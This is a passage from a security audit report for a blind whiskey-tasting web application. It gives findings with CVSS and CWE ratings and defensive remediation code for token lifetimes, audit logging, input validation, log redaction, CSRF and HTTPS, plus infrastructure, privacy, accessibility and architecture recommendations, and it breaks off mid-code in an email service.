**CVSS Score:** 5.5
**CWE:** CWE-613 (Insufficient Session Expiration)
**OWASP:** A07:2021 - Identification and Authentication Failures

**Location:**
- `server/src/middleware/auth.ts:97-106`

#### Vulnerable Code

```typescript
// server/src/middleware/auth.ts:97-106
export function generateAccessToken(payload: JwtPayload): string {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: '24h' });  // Too long!
}

export function generateRefreshToken(payload: JwtPayload): string {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: '7d' });   // Way too long!
}
```

#### Attack Scenario

```
Timeline of Token Theft Attack:

Day 0: Attacker steals access token via XSS or network interception
Day 0-7: Attacker has full access using stolen refresh token
Day 7: Token finally expires

With current settings:
- If access token stolen: 24 hours of unauthorized access
- If refresh token stolen: 7 days of unauthorized access
- User cannot revoke stolen tokens (no token blacklist)
```

#### Remediation Code

```typescript
// server/src/middleware/auth.ts - Reduced token lifetimes

export function generateAccessToken(payload: JwtPayload): string {
  return jwt.sign(payload, config.jwtSecret, { expiresIn: '15m' });  // 15 minutes
}

export function generateRefreshToken(payload: JwtPayload): string {
  return jwt.sign(payload, config.jwtSecret, { expiresIn: '24h' });  // 24 hours max
}

export function generateParticipantToken(payload: ParticipantJwtPayload): string {
  return jwt.sign(payload, config.jwtSecret, { expiresIn: '12h' });  // Session duration
}

// Update cookie settings to match
// server/src/routes/auth.ts
const accessTokenCookieOptions = {
  httpOnly: true,
  secure: config.nodeEnv === 'production',
  sameSite: 'strict' as const,
  maxAge: 15 * 60 * 1000,  // 15 minutes
  path: '/',
};

const refreshTokenCookieOptions = {
  httpOnly: true,
  secure: config.nodeEnv === 'production',
  sameSite: 'strict' as const,
  maxAge: 24 * 60 * 60 * 1000,  // 24 hours
  path: '/api/auth/refresh',  // Only sent to refresh endpoint
};
```

---

### HIGH-05: No Audit Logging for Admin Actions

**Severity:** HIGH
**CVSS Score:** 5.3
**CWE:** CWE-778 (Insufficient Logging)
**OWASP:** A09:2021 - Security Logging and Monitoring Failures

**Location:**
- `server/src/routes/admin.ts`

#### Remediation Code

```typescript
// server/src/db/schema.ts - Add audit_logs table

export const auditLogs = sqliteTable('audit_logs', {
  id: text('id').primaryKey().$defaultFn(() => crypto.randomUUID()),
  timestamp: integer('timestamp', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  actorId: text('actor_id').notNull().references(() => users.id),
  actorEmail: text('actor_email').notNull(),
  action: text('action').notNull(),  // 'user.create', 'user.delete', 'user.role.update', 'session.delete'
  targetType: text('target_type').notNull(),  // 'user', 'session'
  targetId: text('target_id').notNull(),
  targetIdentifier: text('target_identifier'),  // email or session name for readability
  previousValue: text('previous_value'),  // JSON string
  newValue: text('new_value'),  // JSON string
  ipAddress: text('ip_address'),
  userAgent: text('user_agent'),
  requestId: text('request_id'),  // For correlation
});
```

```typescript
// server/src/services/audit.ts (NEW FILE)
import { db, schema } from '../db';
import { Request } from 'express';
import crypto from 'crypto';

export type AuditAction =
  | 'user.create'
  | 'user.delete'
  | 'user.role.update'
  | 'user.email.update'
  | 'user.password.update'
  | 'session.create'
  | 'session.delete'
  | 'session.status.update'
  | 'auth.login.success'
  | 'auth.login.failure'
  | 'auth.logout';

export interface AuditLogEntry {
  actorId: string;
  actorEmail: string;
  action: AuditAction;
  targetType: 'user' | 'session' | 'auth';
  targetId: string;
  targetIdentifier?: string;
  previousValue?: unknown;
  newValue?: unknown;
  req?: Request;
}

export async function logAuditEvent(entry: AuditLogEntry): Promise<void> {
  try {
    await db.insert(schema.auditLogs).values({
      id: crypto.randomUUID(),
      timestamp: new Date(),
      actorId: entry.actorId,
      actorEmail: entry.actorEmail,
      action: entry.action,
      targetType: entry.targetType,
      targetId: entry.targetId,
      targetIdentifier: entry.targetIdentifier,
      previousValue: entry.previousValue ? JSON.stringify(entry.previousValue) : null,
      newValue: entry.newValue ? JSON.stringify(entry.newValue) : null,
      ipAddress: entry.req?.ip || entry.req?.socket?.remoteAddress || null,
      userAgent: entry.req?.headers['user-agent'] || null,
      requestId: entry.req?.headers['x-request-id'] as string || crypto.randomUUID(),
    });
  } catch (error) {
    // Don't let audit logging failures break the application
    console.error('Failed to write audit log:', error);
  }
}

// Helper for common operations
export const audit = {
  userRoleChange: async (
    actor: { id: string; email: string },
    target: { id: string; email: string },
    oldRole: string,
    newRole: string,
    req?: Request
  ) => {
    await logAuditEvent({
      actorId: actor.id,
      actorEmail: actor.email,
      action: 'user.role.update',
      targetType: 'user',
      targetId: target.id,
      targetIdentifier: target.email,
      previousValue: { role: oldRole },
      newValue: { role: newRole },
      req,
    });
  },

  userDelete: async (
    actor: { id: string; email: string },
    target: { id: string; email: string },
    req?: Request
  ) => {
    await logAuditEvent({
      actorId: actor.id,
      actorEmail: actor.email,
      action: 'user.delete',
      targetType: 'user',
      targetId: target.id,
      targetIdentifier: target.email,
      req,
    });
  },

  sessionDelete: async (
    actor: { id: string; email: string },
    session: { id: string; name: string },
    req?: Request
  ) => {
    await logAuditEvent({
      actorId: actor.id,
      actorEmail: actor.email,
      action: 'session.delete',
      targetType: 'session',
      targetId: session.id,
      targetIdentifier: session.name,
      req,
    });
  },

  loginSuccess: async (user: { id: string; email: string }, req?: Request) => {
    await logAuditEvent({
      actorId: user.id,
      actorEmail: user.email,
      action: 'auth.login.success',
      targetType: 'auth',
      targetId: user.id,
      req,
    });
  },

  loginFailure: async (email: string, reason: string, req?: Request) => {
    await logAuditEvent({
      actorId: 'anonymous',
      actorEmail: email,
      action: 'auth.login.failure',
      targetType: 'auth',
      targetId: 'unknown',
      newValue: { reason },
      req,
    });
  },
};
```

```typescript
// server/src/routes/admin.ts - Add audit logging

import { audit } from '../services/audit';

// User role update
router.patch('/users/:userId/role', authenticateUser, requireAdmin, async (req: AuthRequest, res: Response) => {
  const { userId } = req.params;
  const { role } = req.body;

  // ... existing validation

  const user = await db.query.users.findFirst({
    where: eq(schema.users.id, userId),
  });

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const oldRole = user.role;

  // Update role
  await db.update(schema.users)
    .set({ role })
    .where(eq(schema.users.id, userId));

  // Audit log
  await audit.userRoleChange(
    { id: req.userId!, email: req.userEmail! },
    { id: user.id, email: user.email },
    oldRole,
    role,
    req
  );

  return res.json({ success: true });
});

// User deletion
router.delete('/users/:userId', authenticateUser, requireAdmin, async (req: AuthRequest, res: Response) => {
  const { userId } = req.params;

  const user = await db.query.users.findFirst({
    where: eq(schema.users.id, userId),
  });

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  // Audit BEFORE deletion (so we have the user data)
  await audit.userDelete(
    { id: req.userId!, email: req.userEmail! },
    { id: user.id, email: user.email },
    req
  );

  // Delete user
  await db.delete(schema.users).where(eq(schema.users.id, userId));

  return res.json({ success: true });
});
```

---

## Medium Severity Findings

### MED-01: Tokens Stored in localStorage

**Severity:** MEDIUM
**CVSS Score:** 5.0
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)

#### Remediation Code

```typescript
// src/store/authStore.ts - Remove localStorage token storage

// REMOVE these lines:
// localStorage.setItem('accessToken', response.accessToken);
// localStorage.setItem('participantToken', response.participantToken);

// The backend already sets httpOnly cookies, so just rely on those
// Update API client to not inject Authorization headers

// src/services/api.ts - Remove localStorage token injection
async function request<T>(endpoint: string, options: RequestOptions = {}): Promise<T> {
  const { skipAuth, ...fetchOptions } = options;

  const headers: HeadersInit = {
    'Content-Type': 'application/json',
    ...fetchOptions.headers,
  };

  // REMOVE the localStorage token injection block
  // The httpOnly cookies are sent automatically with credentials: 'include'

  const response = await fetch(`${API_BASE_URL}${endpoint}`, {
    ...fetchOptions,
    headers,
    credentials: 'include',  // This sends httpOnly cookies automatically
  });

  // ... rest of function
}
```

---

### MED-02: No Input Length Limits on Backend

**Severity:** MEDIUM
**CVSS Score:** 4.8
**CWE:** CWE-20 (Improper Input Validation)

#### Remediation Code

```typescript
// server/src/utils/schemas.ts (NEW FILE)
import { z } from 'zod';

// Reusable validators
const sanitizedString = (maxLength: number) => z.string()
  .max(maxLength)
  .transform(s => s.trim());

export const registerSchema = z.object({
  email: z.string().email().max(254),
  password: z.string().min(12).max(128),
  displayName: sanitizedString(30).min(2),
});

export const loginSchema = z.object({
  email: z.string().email().max(254),
  password: z.string().min(1).max(128),
});

export const profileUpdateSchema = z.object({
  displayName: sanitizedString(30).min(2).optional(),
  bio: sanitizedString(200).optional(),
  favoriteCategory: z.enum(['bourbon', 'scotch', 'irish', 'japanese', 'rye', 'other']).optional(),
  experienceLevel: z.enum(['beginner', 'intermediate', 'advanced', 'expert']).optional(),
});

export const sessionCreateSchema = z.object({
  name: sanitizedString(100).min(1),
  theme: sanitizedString(50).min(1),
  customTheme: sanitizedString(100).optional(),
  hostName: sanitizedString(30).min(1),
  whiskeys: z.array(z.object({
    name: sanitizedString(100).min(1),
    distillery: sanitizedString(100).min(1),
    age: z.number().int().min(0).max(100).optional(),
    proof: z.number().min(0).max(200),
    price: z.number().min(0).max(100000).optional(),
    region: sanitizedString(50).optional(),
    mashbill: sanitizedString(100).optional(),
    pourSize: sanitizedString(10).default('1.5oz'),
  })).min(1).max(6),
});

export const scoreSubmitSchema = z.object({
  whiskeyId: z.string().uuid(),
  nose: z.number().int().min(1).max(10),
  palate: z.number().int().min(1).max(10),
  finish: z.number().int().min(1).max(10),
  overall: z.number().int().min(1).max(10),
  noseNotes: sanitizedString(500).optional(),
  palateNotes: sanitizedString(500).optional(),
  finishNotes: sanitizedString(500).optional(),
  generalNotes: sanitizedString(1000).optional(),
  identityGuess: sanitizedString(200).optional(),
});

export const joinSessionSchema = z.object({
  inviteCode: z.string().regex(/^[A-Z0-9]{6,8}$/i),
  displayName: sanitizedString(30).min(2),
});

// Middleware factory
export function validate<T>(schema: z.ZodSchema<T>) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({
        error: 'Validation failed',
        details: result.error.errors.map(e => ({
          field: e.path.join('.'),
          message: e.message,
        })),
      });
    }
    req.body = result.data;
    next();
  };
}
```

```typescript
// Apply to routes
import { validate, registerSchema, loginSchema, sessionCreateSchema } from '../utils/schemas';

router.post('/register', registerLimiter, validate(registerSchema), async (req, res) => {
  // req.body is now validated and typed
});

router.post('/login', loginLimiter, validate(loginSchema), async (req, res) => {
  // req.body is now validated and typed
});
```

---

### MED-03: Console Logging in Production

**Severity:** MEDIUM
**CVSS Score:** 4.3
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

#### Remediation Code

```typescript
// server/src/utils/logger.ts (NEW FILE)
import pino from 'pino';
import { config } from '../config';

const redactPaths = [
  'req.headers.authorization',
  'req.headers.cookie',
  'req.body.password',
  'req.body.newPassword',
  'req.body.currentPassword',
  '*.passwordHash',
  '*.accessToken',
  '*.refreshToken',
  '*.participantToken',
];

export const logger = pino({
  level: config.nodeEnv === 'production' ? 'info' : 'debug',

  // Pretty print in development
  transport: config.nodeEnv !== 'production'
    ? { target: 'pino-pretty', options: { colorize: true } }
    : undefined,

  // Redact sensitive fields
  redact: {
    paths: redactPaths,
    censor: '[REDACTED]',
  },

  // Add timestamp
  timestamp: pino.stdTimeFunctions.isoTime,

  // Base context
  base: {
    env: config.nodeEnv,
    service: 'whiskey-canon-blinds',
  },
});

// Request logger middleware
export function requestLogger(req: Request, res: Response, next: NextFunction) {
  const startTime = Date.now();
  const requestId = crypto.randomUUID();

  // Add request ID to headers for correlation
  req.headers['x-request-id'] = requestId;

  res.on('finish', () => {
    const duration = Date.now() - startTime;

    logger.info({
      requestId,
      method: req.method,
      path: req.path,
      statusCode: res.statusCode,
      duration,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
    }, `${req.method} ${req.path} ${res.statusCode} ${duration}ms`);
  });

  next();
}

// Error logger
export function logError(error: Error, context?: Record<string, unknown>) {
  logger.error({
    err: {
      message: error.message,
      stack: config.nodeEnv !== 'production' ? error.stack : undefined,
      name: error.name,
    },
    ...context,
  }, error.message);
}
```

---

### MED-05: No CSRF Protection

**Severity:** MEDIUM
**CVSS Score:** 4.0
**CWE:** CWE-352 (Cross-Site Request Forgery)

#### Remediation Code

```typescript
// server/src/middleware/csrf.ts (NEW FILE)
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';

const CSRF_TOKEN_LENGTH = 32;
const CSRF_COOKIE_NAME = 'csrf_token';
const CSRF_HEADER_NAME = 'x-csrf-token';

// Generate CSRF token
export function generateCsrfToken(): string {
  return crypto.randomBytes(CSRF_TOKEN_LENGTH).toString('hex');
}

// Middleware to set CSRF token cookie
export function csrfTokenSetter(req: Request, res: Response, next: NextFunction) {
  // Only set for GET requests (page loads)
  if (req.method === 'GET') {
    const token = generateCsrfToken();
    res.cookie(CSRF_COOKIE_NAME, token, {
      httpOnly: false,  // Must be readable by JS
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 60 * 60 * 1000,  // 1 hour
    });
  }
  next();
}

// Middleware to validate CSRF token on state-changing requests
export function csrfProtection(req: Request, res: Response, next: NextFunction) {
  // Skip for safe methods
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const cookieToken = req.cookies[CSRF_COOKIE_NAME];
  const headerToken = req.headers[CSRF_HEADER_NAME];

  if (!cookieToken || !headerToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}
```

```typescript
// Frontend: Add CSRF token to requests
// src/services/api.ts

function getCsrfToken(): string | null {
  const match = document.cookie.match(/csrf_token=([^;]+)/);
  return match ? match[1] : null;
}

async function request<T>(endpoint: string, options: RequestOptions = {}): Promise<T> {
  const headers: HeadersInit = {
    'Content-Type': 'application/json',
    ...fetchOptions.headers,
  };

  // Add CSRF token for state-changing requests
  if (!['GET', 'HEAD', 'OPTIONS'].includes(options.method || 'GET')) {
    const csrfToken = getCsrfToken();
    if (csrfToken) {
      headers['x-csrf-token'] = csrfToken;
    }
  }

  // ... rest of function
}
```

---

## Infrastructure Findings

### INFRA-01: No Production Hosting Infrastructure

**Severity:** HIGH
**Category:** Infrastructure Security

**Current State:**
- SQLite database (file-based, not suitable for production)
- No defined hosting platform
- No automatic HTTPS
- No CDN or edge caching
- No automatic backups

**Recommendation:** Migrate to Vercel + Neon PostgreSQL

#### Vercel (Frontend + API Hosting)

**Benefits:**
- Automatic HTTPS/SSL certificates
- Edge functions for API routes
- Preview deployments per pull request
- Built-in DDoS protection
- Global CDN distribution
- Zero-config deployments

**Configuration:**
```json
// vercel.json
{
  "buildCommand": "npm run build",
  "outputDirectory": "dist",
  "rewrites": [
    { "source": "/api/:path*", "destination": "/api/:path*" }
  ],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" }
      ]
    }
  ]
}
```

#### Neon PostgreSQL (Database)

**Benefits:**
- Serverless PostgreSQL (scales to zero, pay-per-use)
- Connection pooling built-in
- Database branching for dev/staging environments
- Automatic backups and point-in-time recovery
- Fully compatible with Drizzle ORM

**Migration Steps:**
1. Create Neon project at console.neon.tech
2. Update Drizzle config for PostgreSQL dialect
3. Convert schema types (SQLite → PostgreSQL)
4. Run migration
5. Update `DATABASE_URL` environment variable

**Updated Drizzle Configuration:**
```typescript
// drizzle.config.ts (updated for Neon)
import { defineConfig } from 'drizzle-kit';

export default defineConfig({
  schema: './server/src/db/schema.ts',
  out: './drizzle',
  dialect: 'postgresql',
  dbCredentials: {
    url: process.env.DATABASE_URL!,
  },
});
```

**Schema Type Changes Required:**
| SQLite | PostgreSQL |
|--------|------------|
| `integer('id')` | `serial('id')` or `uuid('id')` |
| `integer('timestamp', { mode: 'timestamp' })` | `timestamp('timestamp')` |
| `text('json_data')` | `jsonb('json_data')` |

---

### INFRA-02: No HTTPS Enforcement

**Severity:** HIGH
**Category:** Transport Security

**Current State:**
- No automatic HTTP to HTTPS redirect
- No HSTS header configuration
- Development defaults to HTTP

**Impact:**
- Man-in-the-middle attacks possible
- Session hijacking via cookie interception
- Data transmitted in plaintext

**Recommendation:**
Vercel provides automatic HTTPS. For manual deployment, add:

```typescript
// server/src/middleware/https.ts
export function enforceHttps(req: Request, res: Response, next: NextFunction) {
  if (process.env.NODE_ENV === 'production' &&
      req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, `https://${req.headers.host}${req.url}`);
  }
  next();
}
```

---

## Dependency Audit Findings

### DEPS-01: No Automated Vulnerability Scanning

**Severity:** INFO
**Category:** Supply Chain Security

**Current State:**
All dependencies are at current versions with no known vulnerabilities:

| Package | Version | Status |
|---------|---------|--------|
| react | 19.2.0 | Current |
| express | 5.2.1 | Current |
| drizzle-orm | 0.45.1 | Current |
| jsonwebtoken | 9.0.3 | Current |
| bcryptjs | 3.0.3 | Current |
| socket.io | 4.8.3 | Current |
| zod | 4.3.6 | Current |

**Finding:**
No automated vulnerability scanning or dependency update automation in place.

**Recommendation:**
1. Add `npm audit` to CI/CD pipeline
2. Enable GitHub Dependabot or Renovate for automatic updates
3. Configure security alerts

**GitHub Actions Workflow:**
```yaml
# .github/workflows/security.yml
name: Security Audit
on:
  push:
    branches: [main]
  schedule:
    - cron: '0 0 * * 1'  # Weekly on Monday

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - run: npm audit --audit-level=high
```

---

## API Design Findings

### API-01: No API Versioning

**Severity:** MEDIUM
**Category:** API Design

**Current State:**
API routes at `/api/*` with no version prefix.

**Impact:**
- Breaking changes affect all clients simultaneously
- No graceful deprecation path
- Difficult to maintain backward compatibility

**Recommendation:**
Add `/api/v1/` prefix to all routes:

```typescript
// server/src/index.ts
const v1Router = Router();
v1Router.use('/auth', authRoutes);
v1Router.use('/sessions', sessionsRoutes);
v1Router.use('/scores', scoresRoutes);
v1Router.use('/admin', adminRoutes);
v1Router.use('/social', socialRoutes);
v1Router.use('/participants', participantsRoutes);

app.use('/api/v1', v1Router);

// Deprecation warning for old routes
app.use('/api', (req, res, next) => {
  res.setHeader('Deprecation', 'true');
  res.setHeader('Link', '</api/v1>; rel="successor-version"');
  next();
}, v1Router);
```

---

### API-02: No OpenAPI/Swagger Documentation

**Severity:** MEDIUM
**Category:** API Design

**Current State:**
No API documentation exists.

**Impact:**
- Difficult for developers to understand API contracts
- No automated client generation
- Manual testing required

**Recommendation:**
Add OpenAPI specification with swagger-ui-express:

```typescript
// server/src/docs/openapi.ts
import swaggerUi from 'swagger-ui-express';

const openApiSpec = {
  openapi: '3.0.3',
  info: {
    title: 'Whiskey Canon API',
    version: '1.0.0',
    description: 'Blind whiskey tasting platform API',
  },
  servers: [
    { url: '/api/v1', description: 'API v1' }
  ],
  paths: {
    '/auth/login': {
      post: {
        summary: 'User login',
        requestBody: {
          content: {
            'application/json': {
              schema: {
                type: 'object',
                properties: {
                  email: { type: 'string', format: 'email' },
                  password: { type: 'string', minLength: 12 }
                },
                required: ['email', 'password']
              }
            }
          }
        },
        responses: {
          200: { description: 'Login successful' },
          401: { description: 'Invalid credentials' },
          429: { description: 'Rate limit exceeded' }
        }
      }
    }
    // ... additional endpoints
  }
};

app.use('/api/docs', swaggerUi.serve, swaggerUi.setup(openApiSpec));
```

---

## Data Privacy Findings

### PRIV-01: Incomplete GDPR Compliance

**Severity:** MEDIUM
**Category:** Data Privacy

**Current State:**
- GDPR data export endpoint exists (`/api/auth/me/export`) - **GOOD**
- Missing automated data deletion
- No data retention policy
- No privacy policy endpoint

**Missing Features:**

1. **Right to Erasure (Art. 17):** No automated account deletion with cascading data removal
2. **Data Retention Policy:** No defined retention periods for user data, scores, session history
3. **Privacy Policy:** No `/privacy` endpoint serving privacy policy

**Recommendation:**

```typescript
// Add to server/src/routes/auth.ts

// Account deletion (Right to Erasure)
router.delete('/me', authenticateUser, async (req: AuthRequest, res: Response) => {
  const userId = req.userId!;

  // Log deletion for audit
  await audit.logAuditEvent({
    actorId: userId,
    actorEmail: req.userEmail!,
    action: 'user.delete',
    targetType: 'user',
    targetId: userId,
    newValue: { reason: 'user_requested' },
    req,
  });

  // Cascade deletes handled by foreign key constraints
  await db.delete(schema.users).where(eq(schema.users.id, userId));

  // Clear cookies
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');

  return res.json({ message: 'Account deleted successfully' });
});
```

---

### PRIV-02: No Cookie Consent

**Severity:** MEDIUM
**Category:** Data Privacy

**Current State:**
Sets authentication cookies without explicit user consent.

**Impact:**
- Non-compliant with EU ePrivacy Directive
- Potential GDPR violations for EU users

**Recommendation:**
Add cookie consent banner for EU users:

1. Add consent endpoint: `POST /api/consent`
2. Store consent preference in localStorage
3. Delay non-essential cookies until consent given
4. Essential cookies (auth) can be set without consent

---

## Accessibility Findings

### A11Y-01: Minimal ARIA Accessibility

**Severity:** MEDIUM
**Category:** Accessibility (WCAG 2.1)

**Current State:**
Only the Modal component has ARIA attributes:

```typescript
// src/components/ui/Modal.tsx - Has ARIA
role="dialog"
aria-modal="true"
aria-labelledby="modal-title"
aria-label="Close modal"
```

**Missing ARIA in other components:**
- `Button.tsx` - No aria-disabled, aria-pressed states
- `Input.tsx` - No aria-invalid, aria-describedby for errors
- `Header.tsx` - No `<nav>` with aria-label
- `ScoreSlider.tsx` - No aria-valuemin, aria-valuemax, aria-valuenow
- `ParticipantList.tsx` - No aria-live regions for status updates

**Recommendation:**

```typescript
// src/components/ui/Input.tsx - Add ARIA
interface InputProps {
  error?: string;
  // ...
}

export function Input({ error, id, ...props }: InputProps) {
  const errorId = error ? `${id}-error` : undefined;

  return (
    <div>
      <input
        id={id}
        aria-invalid={!!error}
        aria-describedby={errorId}
        {...props}
      />
      {error && (
        <span id={errorId} role="alert" className="text-red-500">
          {error}
        </span>
      )}
    </div>
  );
}
```

```typescript
// src/components/layout/Header.tsx - Add navigation ARIA
<nav aria-label="Main navigation">
  <ul role="menubar">
    <li role="none">
      <Link role="menuitem" to="/">Home</Link>
    </li>
    // ...
  </ul>
</nav>
```

---

### A11Y-02: Dark Mode Only - No Light Theme

**Severity:** MEDIUM
**Category:** Accessibility

**Current State:**
Hardcoded dark theme with no light mode option:

```css
/* src/index.css */
body {
  @apply bg-zinc-900 text-zinc-100;  /* Always dark */
}
```

**Impact:**
- Users with light mode preference cannot use preferred scheme
- No `prefers-color-scheme` media query support
- Accessibility issue for users with certain visual conditions

**Recommendation:**
Add theme provider with system preference detection:

```typescript
// src/contexts/ThemeContext.tsx
import { createContext, useContext, useEffect, useState } from 'react';

type Theme = 'light' | 'dark' | 'system';

interface ThemeContextType {
  theme: Theme;
  setTheme: (theme: Theme) => void;
  resolvedTheme: 'light' | 'dark';
}

const ThemeContext = createContext<ThemeContextType | null>(null);

export function ThemeProvider({ children }: { children: React.ReactNode }) {
  const [theme, setTheme] = useState<Theme>(() =>
    (localStorage.getItem('theme') as Theme) || 'system'
  );

  const resolvedTheme = theme === 'system'
    ? window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
    : theme;

  useEffect(() => {
    document.documentElement.classList.toggle('dark', resolvedTheme === 'dark');
    localStorage.setItem('theme', theme);
  }, [theme, resolvedTheme]);

  return (
    <ThemeContext.Provider value={{ theme, setTheme, resolvedTheme }}>
      {children}
    </ThemeContext.Provider>
  );
}

export const useTheme = () => {
  const context = useContext(ThemeContext);
  if (!context) throw new Error('useTheme must be used within ThemeProvider');
  return context;
};
```

**Tailwind Configuration:**
```javascript
// tailwind.config.js (create if not exists)
module.exports = {
  darkMode: 'class',
  // ... rest of config
}
```

---

## Performance Findings

### PERF-01: Image Format Optimization

**Severity:** LOW
**Category:** Performance

**Current State:**
- PNG format used for screenshots (larger file sizes)
- SVG used for favicon (good)
- User avatars accept PNG/JPEG/GIF/WebP

**Analysis: PNG vs WebP**

| Format | Pros | Cons |
|--------|------|------|
| **PNG** | Lossless compression, universal browser support | Larger file sizes (typically 2-3x WebP) |
| **WebP** | 30-50% smaller than PNG, supports transparency and animation | Older browser support (IE11, older Safari) |

**Current Screenshot Files (PNG):**
- 24 PNG screenshots in `/screenshots/` directory
- Estimated size reduction with WebP: 40-50%

**Recommendation:**
1. Convert existing PNGs to WebP using `sharp`
2. Use `<picture>` element for browser fallback
3. Accept WebP for new avatar uploads (already supported)

**Conversion Script:**
```javascript
// scripts/convert-images.js
import sharp from 'sharp';
import fs from 'fs';
import path from 'path';

const screenshotsDir = './screenshots';

fs.readdirSync(screenshotsDir)
  .filter(f => f.endsWith('.png'))
  .forEach(async (file) => {
    const inputPath = path.join(screenshotsDir, file);
    const outputPath = path.join(screenshotsDir, file.replace('.png', '.webp'));

    await sharp(inputPath)
      .webp({ quality: 85 })
      .toFile(outputPath);

    console.log(`Converted: ${file} → ${file.replace('.png', '.webp')}`);
  });
```

**HTML Usage with Fallback:**
```html
<picture>
  <source srcset="/screenshots/home-page.webp" type="image/webp">
  <img src="/screenshots/home-page.png" alt="Home page screenshot">
</picture>
```

---

### ARCH-01: Client-Side Rendering Architecture Limitations

**Severity:** MEDIUM
**Category:** Architecture
**CWE:** N/A (Architectural)
**Impact:** Performance, SEO, Developer Experience

**Current State:**
The application uses Client-Side Rendering (CSR) with Vite + Express - two separate runtimes:
- Frontend: React 19 + Vite (Client runtime)
- Backend: Express 5 + SQLite (Server runtime)

**Current Data Flow (6 Round-Trips):**
```
1. Browser requests page → Empty HTML shell returned
2. Browser downloads JS bundle (~200-500KB)
3. React mounts → useEffect triggers
4. Fetch request to Express API
5. Express queries SQLite via Drizzle
6. Data returns → React re-renders with content
```

**Issues:**
- **SEO**: Search engines see empty HTML (poor indexing)
- **Initial Load**: Users see loading spinners, not content
- **Bundle Size**: Data fetching logic shipped to browser
- **Boilerplate**: Every data query requires API route setup
- **Type Sharing**: Manual type sync between frontend/backend

**Recommended Architecture: Next.js with React Server Components (RSC)**

**Next.js Data Flow (Streamlined):**
```
1. Server runs Drizzle query directly in component
2. Server renders HTML with data
3. HTML streams to browser
4. React hydrates for interactivity
```

**Benefits:**
| Aspect | Current (Vite + Express) | Next.js (App Router) |
|--------|--------------------------|----------------------|
| Data Fetching | API routes + useEffect | Direct DB access in components |
| SEO | Poor (empty HTML) | Excellent (SSR/SSG) |
| Initial Load | Slow (spinners) | Fast (content-first) |
| Bundle Size | Larger (client data logic) | Smaller (server-only code) |
| Routing | React Router (client) | File-system (server) |
| Deployment | 2 services | 1 service |
| Type Safety | Manual sharing | Natural (same codebase) |

**Impact on Current Stack:**

| Technology | Migration Impact |
|------------|------------------|
| **Drizzle ORM** | ✅ Better - direct queries in Server Components |
| **Tailwind CSS** | ✅ Equal - built-in support in Next.js |
| **Zustand** | ⚠️ Reduced - only needed for UI state (modals, sidebars) |
| **Socket.io** | ❌ Challenge - requires separate solution (see below) |
| **React Router** | ✅ Replaced - file-system routing is simpler |

**Socket.io Challenge:**
Next.js on Vercel is serverless - functions spin up/down and cannot maintain persistent WebSocket connections.

**Solution Options:**

| Option | Serverless-Compatible | Complexity | Cost |
|--------|----------------------|------------|------|
| **Ably** (Recommended) | ✅ Yes | Low | ~$25/mo |
| **Pusher** | ✅ Yes | Low | Free tier |
| **Separate Express** | N/A (self-hosted) | Medium | ~$7/mo |
| **Custom Next.js Server** | ❌ No | High | Variable |

**Recommendation:** Hybrid approach
1. Migrate to Next.js for main app (auth, dashboard, session management)
2. Use Ably/Pusher for real-time OR keep Socket.io on separate microservice
3. Deploy: Next.js → Vercel, Socket.io service → Railway

**Decision Matrix - When to Migrate:**

✅ **Migrate if:**
- SEO matters (public pages, marketing)
- Initial load speed is critical
- Want to eliminate API boilerplate
- Planning Vercel deployment
- Team comfortable with Server Components

❌ **Stay on Vite + Express if:**
- App is 100% real-time (Socket.io is core)
- App is behind login (SEO irrelevant)
- Team prefers strict frontend/backend separation
- Real-time latency < 50ms required

**Migration Timeline:** Phase 6 (Month 3-4) - see Implementation Guide

**Proposed Next.js Project Structure:**
```
app/
├── (auth)/
│   ├── login/page.tsx           # Server Component - direct DB auth check
│   └── register/page.tsx        # Server Component - form with Server Action
├── (dashboard)/
│   ├── layout.tsx               # Server Component - auth guard
│   ├── page.tsx                 # Dashboard home with session stats
│   └── sessions/
│       ├── page.tsx             # Sessions list (Server Component)
│       ├── [id]/page.tsx        # Session detail with real-time scoring
│       └── new/page.tsx         # Create session form
├── api/
│   ├── auth/[...nextauth]/route.ts  # NextAuth.js handlers
│   └── webhooks/ably/route.ts       # Ably webhook for presence
├── components/
│   ├── ui/                      # Client Components ("use client")
│   │   ├── Modal.tsx
│   │   ├── Button.tsx
│   │   └── Toast.tsx
│   └── session/
│       ├── ScoreCard.tsx        # Client Component - interactive scoring
│       └── RealTimeStatus.tsx   # Client Component - Ably subscription
├── lib/
│   ├── db.ts                    # Drizzle + Neon connection (server-only)
│   ├── auth.ts                  # NextAuth.js configuration
│   └── ably.ts                  # Ably client initialization
└── actions/
    ├── sessions.ts              # Server Actions for session CRUD
    └── scores.ts                # Server Actions for score submission
```

**Ably Real-Time Migration Example:**
```typescript
// Before (Socket.io - current)
socket.emit('score-submitted', { participantId, score });
socket.on('phase-changed', (data) => setPhase(data.phase));

// After (Ably - Next.js compatible)
const channel = ably.channels.get(`session-${sessionId}`);
await channel.publish('score-submitted', { participantId, score });
channel.subscribe('phase-changed', (msg) => setPhase(msg.data.phase));
```

---

## Missing Security Features

### MISS-01: Email Integration with AWS SES

#### Complete Implementation

```typescript
// server/src/services/email.ts (NEW FILE)
import { SESClient, SendEmailCommand } from '@aws-sdk/client-ses';
import { config } from '../config';
import { logger } from '../utils/logger';

// Initialize SES client
const sesClient = new SESClient({
  region: config.aws.region,
